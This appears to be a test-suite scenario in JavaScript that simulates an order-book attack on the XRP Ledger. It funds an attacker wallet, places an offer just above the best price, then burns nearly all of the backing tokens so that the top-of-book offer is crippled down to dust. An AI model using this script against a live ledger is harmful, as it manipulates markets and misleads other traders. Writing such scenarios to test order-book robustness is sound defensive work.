import Account from '@xrplkit/account'
import { submitAndWait } from '@xrplkit/test'
import { mul, div, sub, floor } from '@xrplkit/xfl/string'
import { toRippled } from '@xrplkit/amount'
import { fundTrader } from '../lib/iou.js'


const nudgeFactor = '1.25'


export default async function({ socket, fund, book, sides, buy, sell }){
	let attackingWallet = await fund.getWallet({id: `attacker-${buy}-${sell}`})
	let attackingAccount = new Account({ socket, address: attackingWallet.address })
	let payToken = sides[0].token
	let getToken = sides[1].token
	let smallestUnit = payToken.currency === 'XRP'
		? '0.000001'
		: '0.00000000000000001'


	console.log(`funding attacker`)
	await fundTrader({ 
		socket,
		fund,
		traderWallet: attackingWallet, 
		issuerWallet: sides[0].issuerWallet,
		currency: payToken.currency,
		value: '1'
	})
	

	await attackingAccount.loadLines()

	let balance = attackingAccount.balanceOf(payToken)

	console.log(`attacker has ${balance} ${payToken.currency}`)

	let targetPrice = mul(book.bestPrice, '0.99')
	let offerPay = balance
	let offerGet = mul(balance, targetPrice)
	let cripplingGet = mul(smallestUnit, nudgeFactor)
	let cripplingPay = mul(div(cripplingGet, offerGet), offerPay)
	let burnValue = sub(balance, cripplingPay)

	console.log(`offer target price: ${targetPrice} ${payToken.currency}/${getToken.currency}`)
	console.log(`offer initial takerPays: ${offerGet} ${getToken.currency}`)
	console.log(`offer initial takerGets: ${offerPay} ${payToken.currency}`)
	console.log(`offer crippled takerPays: ${cripplingGet} ${getToken.currency}`)
	console.log(`offer crippled takerGets: ${cripplingPay} ${payToken.currency}`)
	console.log(`burn target: ${burnValue} units`)


	await submitAndWait({
		socket,
		tx: {
			TransactionType: 'OfferCreate',
			Account: attackingWallet.address,
			TakerPays: toRippled({
				...getToken,
				value: offerGet
			}),
			TakerGets: toRippled({
				...payToken,
				value: offerPay
			}),
		},
		seed: attackingWallet.seed,
		autofill: true
	})

	console.log(`burning tokens`)

	await submitAndWait({
		socket,
		tx: {
			TransactionType: 'Payment',
			Account: attackingWallet.address,
			Destination: payToken.issuer,
			Amount: {
				...payToken,
				value: burnValue
			}
		},
		seed: attackingWallet.seed,
		autofill: true
	})
}